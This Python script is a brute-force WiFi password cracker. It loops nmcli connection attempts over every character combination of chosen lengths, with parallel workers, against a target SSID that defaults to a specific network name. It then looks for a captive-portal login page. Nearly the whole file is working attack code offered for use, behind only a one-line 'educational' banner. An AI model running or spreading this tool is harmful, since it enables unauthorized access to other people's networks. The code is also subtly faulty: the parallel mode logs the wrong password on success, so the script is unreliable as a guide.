#!/usr/bin/env python3
"""
WiFi Password Cracker - Enhanced Version
A tool for testing WiFi network security through brute-force password attacks.
"""

import subprocess
import requests
import itertools
import string
import argparse
import logging
import sys
import time
import signal
from threading import Thread, Event, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path

# -----------------------------
# Configuration and Constants
# -----------------------------

@dataclass
class Config:
    """Configuration settings for the WiFi cracker."""
    default_ssid: str = 'SkiTheEast'
    default_password_lengths: List[int] = None
    characters: str = string.ascii_letters + string.digits + string.punctuation
    request_timeout: int = 5
    delay_between_attempts: float = 0.05
    max_workers: int = 4
    log_file: str = "wifi_cracker.log"
    
    def __post_init__(self):
        if self.default_password_lengths is None:
            self.default_password_lengths = [4, 5]

# Global configuration
config = Config()

# Event to handle graceful termination
terminate_event = Event()
log_lock = Lock()

# -----------------------------
# Logging Setup
# -----------------------------

def setup_logging(verbose: bool = False) -> None:
    """Configure logging with file and console output."""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    # Create log directory if it doesn't exist
    log_path = Path(config.log_file)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(config.log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    global logger
    logger = logging.getLogger(__name__)

# -----------------------------
# Network Operations
# -----------------------------

class WiFiManager:
    """Manages WiFi connections and network detection."""
    
    @staticmethod
    def connect_to_wifi(ssid: str, password: str) -> bool:
        """
        Attempts to connect to the specified WiFi network using nmcli.
        
        Args:
            ssid: The SSID of the WiFi network
            password: The password for the WiFi network
            
        Returns:
            True if connection is successful, False otherwise
        """
        try:
            # First, disconnect from any existing connection
            disconnect_cmd = ['nmcli', 'dev', 'disconnect', 'wlan0']
            subprocess.run(disconnect_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Attempt to connect
            connect_cmd = ['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password]
            result = subprocess.run(
                connect_cmd, 
                check=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                timeout=10
            )
            
            with log_lock:
                logger.info(f"✅ Successfully connected to: {ssid}")
            return True
            
        except subprocess.CalledProcessError as e:
            with log_lock:
                logger.debug(f"❌ Failed to connect: {e.stderr.decode().strip()}")
            return False
        except subprocess.TimeoutExpired:
            with log_lock:
                logger.debug(f"⏰ Connection attempt timed out")
            return False
        except Exception as e:
            with log_lock:
                logger.error(f"⚠️ Unexpected error: {e}")
            return False
    
    @staticmethod
    def detect_login_url() -> Optional[str]:
        """
        Detects captive portal login URL by checking for redirects.
        
        Returns:
            The detected login URL if redirection occurs, else None
        """
        test_urls = [
            "http://www.google.com",
            "http://httpbin.org/redirect/1",
            "http://example.com"
        ]
        
        for test_url in test_urls:
            try:
                response = requests.get(
                    test_url, 
                    allow_redirects=True, 
                    timeout=config.request_timeout
                )
                
                if response.history:
                    login_url = response.url
                    with log_lock:
                        logger.info(f"🔍 Detected login URL: {login_url}")
                    return login_url
                    
            except requests.RequestException:
                continue
        
        with log_lock:
            logger.info("🔎 No captive portal detected")
        return None
    
    @staticmethod
    def verify_connection(ssid: str) -> bool:
        """
        Verifies that we're actually connected to the correct network.
        
        Args:
            ssid: Expected SSID
            
        Returns:
            True if connected to correct network, False otherwise
        """
        try:
            result = subprocess.run(
                ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show', '--active'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            active_connections = result.stdout.strip().split('\n')
            for conn in active_connections:
                if ssid in conn and '802-11-wireless' in conn:
                    return True
            return False
            
        except Exception:
            return False

# -----------------------------
# Password Generation
# -----------------------------

class PasswordGenerator:
    """Generates password combinations for brute-force attacks."""
    
    @staticmethod
    def generate_combinations(length: int, charset: str = None) -> itertools.product:
        """
        Generates all possible combinations of specified length.
        
        Args:
            length: Length of passwords to generate
            charset: Character set to use (defaults to config.characters)
            
        Yields:
            Password combinations as tuples
        """
        if charset is None:
            charset = config.characters
            
        return itertools.product(charset, repeat=length)
    
    @staticmethod
    def estimate_combinations(lengths: List[int], charset: str = None) -> int:
        """
        Estimates total number of password combinations.
        
        Args:
            lengths: List of password lengths
            charset: Character set to use
            
        Returns:
            Total number of combinations
        """
        if charset is None:
            charset = config.characters
            
        total = 0
        for length in lengths:
            total += len(charset) ** length
        return total

# -----------------------------
# Cracking Engine
# -----------------------------

class WiFiCracker:
    """Main password cracking engine."""
    
    def __init__(self, ssid: str, password_lengths: List[int]):
        self.ssid = ssid
        self.password_lengths = password_lengths
        self.wifi_manager = WiFiManager()
        self.password_generator = PasswordGenerator()
        self.attempts = 0
        self.start_time = None
        
    def try_password(self, password: str) -> Tuple[bool, Optional[str]]:
        """
        Attempts to connect using a single password.
        
        Args:
            password: Password to try
            
        Returns:
            Tuple of (success, login_url)
        """
        if terminate_event.is_set():
            return False, None
            
        self.attempts += 1
        
        with log_lock:
            logger.debug(f"🔑 Attempt {self.attempts}: {password}")
        
        success = self.wifi_manager.connect_to_wifi(self.ssid, password)
        
        if success:
            # Verify we're connected to the right network
            if self.wifi_manager.verify_connection(self.ssid):
                login_url = self.wifi_manager.detect_login_url()
                return True, login_url
            else:
                # Connected but to wrong network, disconnect
                subprocess.run(['nmcli', 'dev', 'disconnect', 'wlan0'], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(config.delay_between_attempts)
        return False, None
    
    def crack_passwords_parallel(self) -> Optional[Tuple[str, Optional[str]]]:
        """
        Attempts to crack passwords using parallel processing.
        
        Returns:
            Tuple of (password, login_url) if successful, None otherwise
        """
        self.start_time = time.time()
        total_combinations = self.password_generator.estimate_combinations(
            self.password_lengths, config.characters
        )
        
        with log_lock:
            logger.info(f"🔓 WiFi Password Cracker Started")
            logger.info(f"📡 Target SSID: {self.ssid}")
            logger.info(f"🔑 Password Lengths: {self.password_lengths}")
            logger.info(f"🔢 Total Combinations: {total_combinations:,}")
            logger.info(f"🚀 Starting parallel brute-force with {config.max_workers} workers...")
        
        with ThreadPoolExecutor(max_workers=config.max_workers) as executor:
            for length in self.password_lengths:
                if terminate_event.is_set():
                    break
                    
                with log_lock:
                    logger.info(f"🔍 Trying passwords of length: {length}")
                
                # Submit all passwords of current length to executor
                futures = []
                for combo in self.password_generator.generate_combinations(length):
                    if terminate_event.is_set():
                        break
                        
                    password = ''.join(combo)
                    future = executor.submit(self.try_password, password)
                    futures.append(future)
                
                # Check results as they complete
                for future in as_completed(futures):
                    if terminate_event.is_set():
                        break
                        
                    success, login_url = future.result()
                    if success:
                        elapsed = time.time() - self.start_time
                        with log_lock:
                            logger.info(f"🎉 SUCCESS! Password found: {password}")
                            logger.info(f"⏱️ Time elapsed: {elapsed:.2f} seconds")
                            logger.info(f"🔢 Total attempts: {self.attempts}")
                            if login_url:
                                logger.info(f"🌐 Login URL: {login_url}")
                        return password, login_url
        
        return None
    
    def crack_passwords_sequential(self) -> Optional[Tuple[str, Optional[str]]]:
        """
        Attempts to crack passwords sequentially (fallback method).
        
        Returns:
            Tuple of (password, login_url) if successful, None otherwise
        """
        self.start_time = time.time()
        
        with log_lock:
            logger.info(f"🔓 WiFi Password Cracker Started (Sequential Mode)")
            logger.info(f"📡 Target SSID: {self.ssid}")
            logger.info(f"🔑 Password Lengths: {self.password_lengths}")
        
        for length in self.password_lengths:
            if terminate_event.is_set():
                break
                
            with log_lock:
                logger.info(f"🔍 Trying passwords of length: {length}")
            
            for combo in self.password_generator.generate_combinations(length):
                if terminate_event.is_set():
                    break
                    
                password = ''.join(combo)
                success, login_url = self.try_password(password)
                
                if success:
                    elapsed = time.time() - self.start_time
                    with log_lock:
                        logger.info(f"🎉 SUCCESS! Password found: {password}")
                        logger.info(f"⏱️ Time elapsed: {elapsed:.2f} seconds")
                        logger.info(f"🔢 Total attempts: {self.attempts}")
                        if login_url:
                            logger.info(f"🌐 Login URL: {login_url}")
                    return password, login_url
        
        return None

# -----------------------------
# Utility Functions
# -----------------------------

def graceful_exit(signum=None, frame=None) -> None:
    """Handle graceful termination signals."""
    with log_lock:
        logger.info("🛑 Termination signal received. Stopping...")
    terminate_event.set()

def print_banner() -> None:
    """Print application banner."""
    banner = """
╔══════════════════════════════════════════════════════════╗
║                    WiFi Password Cracker                 ║
║                 Enhanced Version v2.0                    ║
║           For Educational & Security Testing Only       ║
╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

# -----------------------------
# Argument Parsing
# -----------------------------

def parse_arguments() -> argparse.Namespace:
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        description="WiFi Password Cracker - Enhanced Version",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -s MyNetwork -l 4 5 6
  %(prog)s --ssid "WiFi Name" --lengths 8 --verbose
  %(prog)s -s TestNetwork -l 4 --workers 8 --delay 0.01
        """
    )
    
    parser.add_argument(
        '-s', '--ssid',
        type=str,
        default=config.default_ssid,
        help=f'SSID of target WiFi network (default: {config.default_ssid})'
    )
    
    parser.add_argument(
        '-l', '--lengths',
        type=int,
        nargs='+',
        default=config.default_password_lengths,
        help=f'Password lengths to attempt (default: {config.default_password_lengths})'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose logging for debugging'
    )
    
    parser.add_argument(
        '-w', '--workers',
        type=int,
        default=config.max_workers,
        help=f'Number of parallel workers (default: {config.max_workers})'
    )
    
    parser.add_argument(
        '-d', '--delay',
        type=float,
        default=config.delay_between_attempts,
        help=f'Delay between attempts in seconds (default: {config.delay_between_attempts})'
    )
    
    parser.add_argument(
        '--charset',
        type=str,
        default=config.characters,
        help='Custom character set for password generation'
    )
    
    parser.add_argument(
        '--sequential',
        action='store_true',
        help='Use sequential cracking instead of parallel'
    )
    
    return parser.parse_args()

# -----------------------------
# Main Function
# -----------------------------

def main() -> None:
    """Main entry point of the application."""
    # Parse arguments
    args = parse_arguments()
    
    # Update config with arguments
    config.characters = args.charset
    config.max_workers = args.workers
    config.delay_between_attempts = args.delay
    
    # Setup logging
    setup_logging(args.verbose)
    
    # Print banner
    print_banner()
    
    # Register signal handlers
    try:
        signal.signal(signal.SIGINT, graceful_exit)
        signal.signal(signal.SIGTERM, graceful_exit)
    except Exception as e:
        logger.warning(f"⚠️ Could not set signal handlers: {e}")
    
    # Create and run cracker
    cracker = WiFiCracker(args.ssid, args.lengths)
    
    try:
        if args.sequential:
            result = cracker.crack_passwords_sequential()
        else:
            result = cracker.crack_passwords_parallel()
        
        if result is None:
            elapsed = time.time() - cracker.start_time
            with log_lock:
                logger.warning("⚠️ Password not found within specified lengths")
                logger.info(f"⏱️ Total time elapsed: {elapsed:.2f} seconds")
                logger.info(f"🔢 Total attempts made: {cracker.attempts}")
    
    except KeyboardInterrupt:
        logger.info("👋 User interrupted the process")
    
    except Exception as e:
        logger.error(f"💥 Unexpected error: {e}")
    
    finally:
        logger.info("🔚 Script execution completed")

if __name__ == "__main__":
    main()
